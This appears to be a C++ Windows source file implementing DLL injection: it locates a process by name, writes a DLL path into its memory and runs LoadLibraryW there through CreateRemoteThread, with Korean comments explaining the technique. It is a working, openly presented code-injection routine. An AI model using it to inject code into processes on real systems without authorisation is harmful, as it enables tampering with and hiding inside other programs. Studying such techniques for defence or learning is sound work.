#include <iostream>
#include <direct.h>
#include <Windows.h>
#include <tlhelp32.h> 

using namespace std;

wstring get_current_directory() {
    char cwd[1024];
    if (_getcwd(cwd, sizeof(cwd)) != NULL) {
        // Convert char[] (cwd) to std::wstring
        return std::wstring(cwd, cwd + strlen(cwd));
    }
    else {
        // Error getting current directory
        return L"Error getting current directory";
    }
}

DWORD getProcessID(const wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cerr << "Failed to create snapshot." << endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

DWORD check_pid(const wstring& process_name) {
    wstring targetProcess = process_name;
    DWORD pid = getProcessID(targetProcess);

    if (pid) {
        wcout << "Process " << targetProcess << " found with PID: " << pid << endl;
        return pid;
    }
    else {
        wcout << "Process " << targetProcess << " not found." << endl;
        return 0;
    }
}

bool isValidNumber(const string& str) {
    for (char c : str) {
        if (!isdigit(c)) {
            return false;
        }
    }
    return true;
}


bool dll_injection(
    __in DWORD pid,
    __in const std::wstring& dll_name
) {
    bool result = false;
    HANDLE process_handle = nullptr;
    HANDLE thread_handle = nullptr;
    LPVOID remote_buffer = nullptr;
    HMODULE module = {};
    LPTHREAD_START_ROUTINE thread_start_routine = nullptr;
    do {
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        // Target Process is not open
        if (process_handle == nullptr) {
            std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
            break;
        }

        // Allocate memory in the target process for the DLL path
        remote_buffer = VirtualAllocEx(
            process_handle,
            nullptr,
            (dll_name.size() + 1) * sizeof(wchar_t), // Ensure null termination
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (!remote_buffer) {
            std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
            break;
        }

        // Write the DLL path into the allocated memory
        if (!WriteProcessMemory(
            process_handle,
            remote_buffer,
            dll_name.c_str(),
            (dll_name.size() + 1) * sizeof(wchar_t), // Include null terminator
            nullptr)
            ) {
            std::cerr << "Failed to write process memory. Error: " << GetLastError() << std::endl;
            break;
        }

        // Get handle to Kernel32.dll
        module = GetModuleHandle(L"kernel32.dll");
        if (!module) {
            std::cerr << "Failed to get handle for kernel32.dll. Error: " << GetLastError() << std::endl;
            break;
        }

        // Get address of LoadLibraryW in Kernel32.dll
        thread_start_routine = (LPTHREAD_START_ROUTINE)GetProcAddress(module, "LoadLibraryW");
        if (!thread_start_routine) {
            std::cerr << "Failed to get address of LoadLibraryW. Error: " << GetLastError() << std::endl;
            break;
        }

        // CreateRemoteThread() 함수는 스레드를 생성하는 함수인데, 
        // 저 함수를 호출하는 프로세스가 아닌 다른 프로세스에 스레드를 생성하는 기능을 가지고 있다
        // 여기서 재미있는 점은 DLL을 읽어서 실행가능한 영역에 적재하는 함수인
        // LoadLibrary() 함수가 스레드 프로시저와 비슷한 모양을 가지고 있다는 것이다. CreateRemoteThread()를 활용하는 DLL injection은, 
        // 바로 이 점을 이용해서 원하는 DLL을 적재하는 스레드를 생성시켜 대상 프로세스에 나의 코드를 주입하는 방법이다
        //
        // create a thread that runs in the virtual address space of another process and optionally specify extended attributes.
        // use LoadLibrary() function to load our dll to target process's runtime
        thread_handle = CreateRemoteThread(
            process_handle,
            nullptr,
            0,
            thread_start_routine,
            remote_buffer,
            0,
            nullptr
        );

        if (!thread_handle) {
            std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
            break;
        }

        // time out 10 sec
        DWORD waitResult = WaitForSingleObject(thread_handle, 10000);

        if (waitResult != WAIT_OBJECT_0) {
            std::cerr << "Remote thread did not complete properly. Wait result: " << waitResult << std::endl;
            break;
        }

        // Get the exit code of the remote thread (which should be the return value of LoadLibraryW)
        DWORD exit_code = 0;
        if (!GetExitCodeThread(thread_handle, &exit_code)) {
            std::cerr << "Failed to get thread exit code. Error: " << GetLastError() << std::endl;
            break;
        }

        // If LoadLibraryW failed, it returns NULL (0)
        if (exit_code == 0) {
            std::cerr << "DLL injection failed: LoadLibraryW returned NULL. The path may be incorrect or the DLL is invalid." << std::endl;
            break;
        }

        std::cout << "DLL successfully injected at base address: " << exit_code << std::endl;
        result = true;

    } while (false);

    // Cleanup
    if (remote_buffer) {
        VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
    }
    if (thread_handle) {
        CloseHandle(thread_handle);
    }
    if (process_handle) {
        CloseHandle(process_handle);
    }

    return result;
}
